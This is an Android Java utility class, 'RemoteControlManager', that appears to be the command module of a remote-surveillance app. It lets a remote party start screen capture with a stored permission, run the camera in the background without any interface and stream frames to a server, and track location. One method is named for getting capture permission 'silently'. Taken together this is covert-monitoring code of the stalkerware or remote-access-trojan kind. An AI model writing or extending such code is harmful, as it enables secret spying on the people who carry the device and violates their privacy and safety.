package com.example.myapplication.utils;

import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.example.myapplication.App;

public class RemoteControlManager {
    private static final String TAG = "RemoteControlManager";
    private static RemoteControlManager instance;
    
    // Store media projection data for remote screen capture
    private Intent mediaProjectionData;
    private int mediaProjectionResultCode;
    private boolean hasScreenCapturePermission = false;
    
    private RemoteControlManager() {
        // Private constructor for singleton
    }
    
    public static synchronized RemoteControlManager getInstance() {
        if (instance == null) {
            instance = new RemoteControlManager();
        }
        return instance;
    }
    
    // Store screen capture permission for later use
    public void setScreenCapturePermission(Intent data, int resultCode) {
        this.mediaProjectionData = data;
        this.mediaProjectionResultCode = resultCode;
        this.hasScreenCapturePermission = true;
        Log.d(TAG, "Screen capture permission stored for remote use");
    }
    
    // Remote screen capture control
    public void startScreenCapture() {
        try {
            Context context = App.getContext();
            if (context == null) {
                Log.e(TAG, "Context is null, cannot start screen capture");
                return;
            }
            
            if (!hasScreenCapturePermission) {
                Log.e(TAG, "No screen capture permission available");
                // Try to get permission from MediaProjectionManager
                requestScreenCapturePermissionSilently();
                return;
            }
            
            // Use ScreenshotManager for remote screen capture
            ScreenshotManager.getInstance().startCapture(context, mediaProjectionData, mediaProjectionResultCode, 
                new ScreenshotManager.ScreenshotListener() {
                    @Override
                    public void onScreenshotAvailable(byte[] data) {
                        Log.d(TAG, "Remote screen capture: Screenshot captured");
                    }
                    
                    @Override
                    public void onScreenshotError(String error) {
                        Log.e(TAG, "Remote screen capture error: " + error);
                    }
                });
                
            Log.d(TAG, "Remote screen capture started successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting remote screen capture", e);
        }
    }
    
    public void stopScreenCapture() {
        try {
            ScreenshotManager.getInstance().stopCapture();
            Log.d(TAG, "Remote screen capture stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping remote screen capture", e);
        }
    }
    
    // Remote camera control
    public void startCamera(String cameraType) {
        try {
            Context context = App.getContext();
            if (context == null) {
                Log.e(TAG, "Context is null, cannot start camera");
                return;
            }
            
            // For remote camera, we'll use a background camera without UI
            CameraManager.getInstance().startCameraRemote(context, cameraType, new CameraManager.CameraStreamListener() {
                @Override
                public void onFrameAvailable(java.nio.ByteBuffer data, int width, int height, long timestamp) {
                    byte[] byteArray = new byte[data.capacity()];
                    data.get(byteArray);
                    CameraManager.getInstance().sendCameraDataToServer(byteArray, width, height);
                }
                
                @Override
                public void onCameraError(String error) {
                    Log.e(TAG, "Remote camera error: " + error);
                }
            });
            
            Log.d(TAG, "Remote camera started: " + cameraType);
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting remote camera", e);
        }
    }
    
    public void stopCamera() {
        try {
            CameraManager.getInstance().stopCamera();
            Log.d(TAG, "Remote camera stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping remote camera", e);
        }
    }
    
    public void switchCamera() {
        try {
            CameraManager.getInstance().switchCamera();
            Log.d(TAG, "Remote camera switched");
        } catch (Exception e) {
            Log.e(TAG, "Error switching remote camera", e);
        }
    }
    
    // Remote location control
    public void startLocation() {
        try {
            Context context = App.getContext();
            if (context == null) {
                Log.e(TAG, "Context is null, cannot start location");
                return;
            }
            
            LocationManager.getInstance().startLocationUpdates(context, new LocationManager.LocationUpdateListener() {
                @Override
                public void onLocationUpdate(android.location.Location location) {
                    Log.d(TAG, "Remote location update: " + location.getLatitude() + ", " + location.getLongitude());
                }
                
                @Override
                public void onLocationError(String error) {
                    Log.e(TAG, "Remote location error: " + error);
                }
            });
            
            Log.d(TAG, "Remote location tracking started");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting remote location", e);
        }
    }
    
    public void stopLocation() {
        try {
            LocationManager.getInstance().stopLocationUpdates();
            Log.d(TAG, "Remote location tracking stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping remote location", e);
        }
    }
    
    // Try to get screen capture permission silently (may not work on all devices)
    private void requestScreenCapturePermissionSilently() {
        try {
            Context context = App.getContext();
            if (context == null) return;
            
            // This is a fallback - in practice, the permission should be granted through the UI first
            Log.w(TAG, "Screen capture permission not available for remote control. Permission must be granted through UI first.");
            
        } catch (Exception e) {
            Log.e(TAG, "Error requesting screen capture permission silently", e);
        }
    }
    
    // Check if we have necessary permissions
    public boolean hasScreenCapturePermission() {
        return hasScreenCapturePermission;
    }
    
    // Reset permissions (e.g., when app is restarted)
    public void resetPermissions() {
        hasScreenCapturePermission = false;
        mediaProjectionData = null;
        mediaProjectionResultCode = 0;
    }
}
